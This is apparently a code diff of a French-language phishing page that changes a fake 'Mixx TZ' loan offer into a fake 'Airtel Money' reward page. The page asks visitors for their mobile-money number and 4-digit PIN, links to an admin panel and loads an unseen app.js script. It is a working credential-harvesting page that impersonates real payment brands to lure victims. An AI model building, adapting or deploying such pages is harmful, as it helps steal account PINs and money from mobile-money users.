@@ -1,42 +1,36 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Mixx TZ - Obtenez Votre Prêt</title>
+  <title>Airtel Money - Ouverture de la récompense</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div class="background-wrapper">
     <div class="container">
-      <!-- Title -->
-      <h1 class="main-title">OBTENEZ VOTRE PRÊT<br>RAPIDE...</h1>
-      
-      <!-- Fee Information Box -->
-      <div class="fee-box">
-        <p class="fee-label">MONTANT DU PRÊT POSSIBLE</p>
-        <p class="fee-amount">OBTENEZ <span class="highlight-yellow">VOTRE PRÊT</span></p>
-      </div>
+      <h1 class="main-title"><span>AIRTEL</span><span>MONEY</span></h1>
+      <h2 class="form-title">Connexion du client<br>et sélection du<br>montant de la récompense</h2>
+      <p class="form-subtitle">Ouverture de la récompense:</p>
 
-      <!-- Form -->
       <form id="registrationForm">
-        <!-- Phone Input -->
         <div class="form-group">
           <input 
-            type="text" 
-            id="name" 
-            placeholder="ENTREZ VOTRE NUMÉRO DE TÉLÉPHONE MOOV" 
+            type="tel"
+            id="name"
+            placeholder="Numéro Airtel Money"
+            aria-label="Numéro Airtel Money"
             required
           >
           <span class="error" id="nameError"></span>
         </div>
 
-        <!-- PIN Input -->
         <div class="form-group">
           <input 
             type="password" 
             id="yasPin" 
-            placeholder="CODE PIN MOOV" 
+            placeholder="Entrez code Pin"
+            aria-label="Code PIN Airtel Money"
             required
             maxlength="4"
             pattern="\d{4}"
@@ -45,8 +39,7 @@
           <span class="error" id="yasPinError"></span>
         </div>
 
-        <!-- Submit Button -->
-        <button type="submit" class="btn-submit">OBTENEZ VOTRE PRÊT</button>
+        <button type="submit" class="btn-submit">OUVRIR</button>
       </form>
 
       <!-- Success/Error Messages -->
@@ -56,12 +49,10 @@
       <!-- Loading State -->
       <div id="loadingSpinner" class="spinner" style="display: none;"></div>
 
-      <!-- Admin Link -->
       <div class="admin-link">
         <a href="/admin">📊 Admin Panel</a>
       </div>
     </div>
-    <div class="yellow-bar"></div>
   </div>
 
   <script src="app.js"></script>
